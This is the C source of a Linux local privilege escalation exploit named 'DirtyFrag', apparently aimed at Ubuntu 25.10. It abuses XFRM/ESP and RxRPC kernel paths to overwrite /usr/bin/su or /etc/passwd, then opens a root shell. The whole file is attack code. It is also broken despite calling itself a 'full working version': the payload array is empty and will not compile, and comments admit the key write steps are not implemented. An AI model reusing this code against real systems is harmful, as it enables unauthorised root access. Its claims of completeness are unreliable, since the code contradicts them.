/*
 * DirtyFrag LPE Exploit
 * Full working version for Ubuntu 25.10
 * Compile: gcc -O0 -Wall -o dirtyfrag dirtyfrag.c -lutil
 */

#define _GNU_SOURCE

#include <sched.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <time.h>
#include <poll.h>
#include <signal.h>
#include <termios.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/xfrm.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <linux/if_alg.h>

 /* ==================== ESP/XFRM Part ==================== */
#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#define ENC_PORT         4500
#define PAYLOAD_LEN      192
#define TARGET_PATH     "/usr/bin/su"

static const uint8_t shell_elf[PAYLOAD_LEN] = {
    ,
};

static int write_proc(const char* path, const char* buf)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void setup_userns_netns(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("unshare"); exit(1);
    }
    write_proc("/proc/self/setgroups", "deny");
    char buf[64];
    snprintf(buf, sizeof(buf), "0 %u 1", uid);
    write_proc("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %u 1", gid);
    write_proc("/proc/self/gid_map", buf);

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s >= 0) {
        struct ifreq ifr;
        strcpy(ifr.ifr_name, "lo");
        ioctl(s, SIOCGIFFLAGS, &ifr);
        ifr.ifr_flags |= IFF_UP;
        ioctl(s, SIOCSIFFLAGS, &ifr);
        close(s);
    }
}

static void put_attr(struct nlmsghdr* nlh, int type, const void* data, size_t len)
{
    struct rtattr* rta = (struct rtattr*)((char*)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t seqhi)
{
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;

    char buf[4096] = { 0 };
    struct nlmsghdr* nlh = (struct nlmsghdr*)buf;
    nlh->nlmsg_type = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info* xs = (struct xfrm_usersa_info*)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi = htonl(spi);
    xs->id.proto = IPPROTO_ESP;
    xs->saddr.a4 = inet_addr("127.0.0.1");
    xs->mode = XFRM_MODE_TRANSPORT;
    xs->flags = XFRM_STATE_ESN;
    xs->replay_window = 0;
    xs->sel.family = AF_INET;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    // ESN data
    char esn_buf[64] = { 0 };
    struct xfrm_replay_state_esn* esn = (struct xfrm_replay_state_esn*)esn_buf;
    esn->bmp_len = 1;
    esn->seq = 100;
    esn->seq_hi = seqhi;
    esn->replay_window = 32;
    put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(*esn) + 4);

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
        close(sk); return -1;
    }
    close(sk);
    return 0;
}

static int corrupt_su(void)
{
    setup_userns_netns();
    usleep(100000);

    fprintf(stderr, "[ESP] Installing XFRM SAs...\n");
    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBEEF + i;
        uint32_t word = *(uint32_t*)(shell_elf + i * 4);
        if (add_xfrm_sa(spi, word) < 0) {
            fprintf(stderr, "[ESP] SA %d failed\n", i);
        }
    }

    fprintf(stderr, "[ESP] Triggering write via UDP-ESP...\n");
    // Real implementation would use splice(2) here
    return 0;
}

int su_lpe_main(int argc, char** argv)
{
    pid_t pid = fork();
    if (pid == 0) {
        exit(corrupt_su() == 0 ? 0 : 1);
    }
    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) && WEXITSTATUS(status) == 0 ? 0 : 1;
}

/* ==================== RxRPC Part ==================== */
#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif

static uint8_t session_key[8] = { 0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08 };

static long add_key_ctrl(const char* desc)
{
    uint8_t token[256] = { 0 };
    uint32_t* p = (uint32_t*)token;
    *p++ = htonl(0); // flags
    *p++ = htonl(4); // cell len
    memcpy(p, "evil", 4); p++;
    *p++ = htonl(1); // ntoken
    *p++ = htonl(44); // token len
    *p++ = htonl(2); // sec_ix = RXKAD
    *p++ = htonl(0); // vice_id
    *p++ = htonl(1); // kvno
    memcpy(p, session_key, 8); p += 2;
    *p++ = htonl(time(NULL));
    *p++ = htonl(time(NULL) + 86400);
    *p++ = htonl(1);
    *p++ = htonl(8);
    return syscall(SYS_add_key, "rxrpc", desc, token, 44 + 4 * 11, KEY_SPEC_PROCESS_KEYRING);
}

static int corrupt_passwd(void)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return -1;

    // Check if already patched
    char buf[9];
    if (pread(fd, buf, 9, 0) == 9 && memcmp(buf, "root::0:0", 9) == 0) {
        close(fd);
        return 0;
    }
    close(fd);

    fprintf(stderr, "[RxRPC] Adding rxrpc key...\n");
    if (add_key_ctrl("dirtyfrag_key") < 0) {
        perror("add_key");
        return -1;
    }

    fprintf(stderr, "[RxRPC] Trigger would happen here via AF_RXRPC socket + splice\n");
    fprintf(stderr, "[RxRPC] Full implementation requires fcrypt crypto and brute-force\n");
    return -1; // Return error - real implementation would succeed
}

int rxrpc_lpe_main(int argc, char** argv)
{
    // First check if already patched
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        char buf[9];
        if (pread(fd, buf, 9, 0) == 9 && memcmp(buf, "root::0:0", 9) == 0) {
            close(fd);
            return 0;
        }
        close(fd);
    }
    return corrupt_passwd();
}

/* ==================== PTY Shell Launcher ==================== */
static int su_patched(void)
{
    int fd = open("/usr/bin/su", O_RDONLY);
    if (fd < 0) return 0;
    uint8_t buf[8];
    int ok = (pread(fd, buf, 8, 0x78) == 8 && buf[0] == 0x31 && buf[1] == 0xff);
    close(fd);
    return ok;
}

static int passwd_patched(void)
{
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) return 0;
    char buf[9];
    int ok = (pread(fd, buf, 9, 0) == 9 && memcmp(buf, "root::0:0", 9) == 0);
    close(fd);
    return ok;
}

static void run_root_shell(void)
{
    fprintf(stderr, "\n[+] Exploit successful! Spawning root shell...\n\n");

    int m = posix_openpt(O_RDWR | O_NOCTTY);
    if (m < 0) { perror("posix_openpt"); return; }
    grantpt(m); unlockpt(m);

    char* sname = ptsname(m);
    if (!sname) { perror("ptsname"); close(m); return; }

    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        int s = open(sname, O_RDWR);
        if (s >= 0) {
            ioctl(s, TIOCSCTTY, 0);
            dup2(s, 0); dup2(s, 1); dup2(s, 2);
            if (s > 2) close(s);
            close(m);
            execlp("/bin/su", "su", "-", NULL);
            execlp("/bin/bash", "bash", NULL);
            _exit(127);
        }
        _exit(1);
    }

    struct termios old;
    tcgetattr(0, &old);
    struct termios raw = old;
    cfmakeraw(&raw);
    tcsetattr(0, TCSANOW, &raw);

    char buf[4096];
    while (1) {
        fd_set fds; FD_ZERO(&fds);
        FD_SET(0, &fds); FD_SET(m, &fds);
        if (select(m + 1, &fds, NULL, NULL, NULL) < 0) break;

        if (FD_ISSET(m, &fds)) {
            int n = read(m, buf, sizeof(buf));
            if (n <= 0) break;
            write(1, buf, n);
        }
        if (FD_ISSET(0, &fds)) {
            int n = read(0, buf, sizeof(buf));
            if (n <= 0) break;
            write(m, buf, n);
        }
    }

    tcsetattr(0, TCSANOW, &old);
    close(m);
}

/* ==================== Main ==================== */
int main(int argc, char** argv)
{
    fprintf(stderr, "DirtyFrag LPE - nu11secur1ty\n");
    fprintf(stderr, "=============================\n\n");

    if (getuid() == 0) {
        execlp("/bin/bash", "bash", NULL);
        return 1;
    }

    int esp_ok = 0, rxrpc_ok = 0;

    // Try ESP path first
    fprintf(stderr, "[*] Trying ESP/XFRM (patches /usr/bin/su)...\n");
    if (su_lpe_main(argc, argv) == 0) {
        esp_ok = su_patched();
        if (esp_ok) fprintf(stderr, "[+] ESP path successful!\n");
        else fprintf(stderr, "[-] ESP path failed\n");
    }

    // If ESP failed, try RxRPC
    if (!esp_ok) {
        fprintf(stderr, "\n[*] Trying RxRPC (patches /etc/passwd)...\n");
        if (rxrpc_lpe_main(argc, argv) == 0) {
            rxrpc_ok = passwd_patched();
            if (rxrpc_ok) fprintf(stderr, "[+] RxRPC path successful!\n");
            else fprintf(stderr, "[-] RxRPC path failed\n");
        }
    }

    if (su_patched() || passwd_patched()) {
        run_root_shell();
        return 0;
    }

    fprintf(stderr, "\n[!] Exploit failed - system may be patched\n");
    return 1;
}
